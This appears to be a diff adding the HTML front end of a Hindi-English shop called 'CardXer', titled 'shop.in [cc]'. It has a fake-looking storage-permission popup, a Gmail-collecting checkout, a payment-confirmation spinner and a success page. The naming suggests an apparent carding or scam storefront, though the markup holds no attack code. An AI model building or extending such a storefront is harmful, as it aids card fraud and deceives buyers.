@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shop.in [cc]</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+
+    <!-- Storage Permission Popup -->
+    <div id="permissionPopup" class="popup-overlay">
+        <div class="popup-box">
+            <h3>Storage Permission Required</h3>
+            <p>App ko sahi se run karne ke liye storage permission ki zaroorat hai.</p>
+            <button onclick="allowPermission()" class="btn-allow">Allow Permission</button>
+        </div>
+    </div>
+
+    <!-- Customer Support Warning Popup -->
+    <div id="supportPopup" class="popup-overlay" style="display: none;">
+        <div class="popup-box support-popup-box">
+            <h3>Notice</h3>
+            <p class="popup-msg">Plz ,First purchase product</p>
+            <button onclick="closeSupportPopup()" class="btn-ok">OK</button>
+        </div>
+    </div>
+
+    <!-- PAGE 1: Welcome Screen -->
+    <div id="page1" class="page active">
+        <h1 class="welcome-text">Welcome To CardXer</h1>
+        <div class="admin-shop-box">Admin shop</div>
+
+        <div class="dashboard-instructions">
+            <h3>How To Buy Products</h3>
+            <p>1. Click Buy Now</p>
+            <p>2. Fill Your Gmail ID<br><small>[Because I send product to your Gmail]</small></p>
+            <p>3. Click Enter & Pay</p>
+            <p>4. Complete Payment</p>
+            <p>5. And wait 1 to 2 hours</p>
+        </div>
+
+        <button class="next-btn" onclick="goToNextPage()">NEXT</button>
+    </div>
+
+    <!-- PAGE 2: Main Shop Dashboard -->
+    <div id="page2" class="page">
+        <div class="top-bar">
+            <div class="online-indicator">
+                <span class="green-dot"></span> ONLINE
+            </div>
+        </div>
+        <div class="products-container" id="productsGrid"></div>
+    </div>
+
+    <!-- PAGE 3: Checkout Page -->
+    <div id="page3" class="page">
+        <div class="top-bar">
+            <div class="online-indicator">
+                <span class="green-dot"></span> ONLINE
+            </div>
+        </div>
+
+        <div class="checkout-card">
+            <h2 id="checkoutPriceProfit" class="glowing-price"></h2>
+            
+            <div class="input-group">
+                <label for="userGmail">Enter Your Gmail ID:</label>
+                <input type="email" id="userGmail" placeholder="example@gmail.com" required>
+            </div>
+
+            <p class="receive-note">Product will be received on your Gmail within 1-2 hours.</p>
+
+            <button id="payEnterBtn" class="blue-glow-btn" onclick="processPayment()">ENTER & PAY</button>
+            <button class="back-btn" onclick="backToShop()">Back to Shop</button>
+
+            <!-- Red Glowing Customer Support Button -->
+            <button class="customer-support-btn" onclick="openCustomerSupport()">CUSTOMER SUPPORT</button>
+        </div>
+    </div>
+
+    <!-- PAGE 3.5: Loading / Confirming Payment Page -->
+    <div id="pageLoading" class="page">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <h2>Confirming Payment...</h2>
+            <p>Kripya payment complete karein, verification me lagbhag 1 minute lag sakta hai.</p>
+            <p class="go-payment-text">GO AND PAYMENT</p>
+        </div>
+    </div>
+
+    <!-- PAGE 4: Success Page -->
+    <div id="page4" class="page">
+        <div class="success-box">
+            <div class="success-icon">✓</div>
+            <h2>Successfully Purchased</h2>
+            <p>Wait Few Hours. Product will be sent to your Gmail.</p>
+            <button class="next-btn" onclick="backToShop()">Back to Home</button>
+        </div>
+    </div>
+
+    <script src="assets/js/script.js"></script>
+</body>
+</html>
+
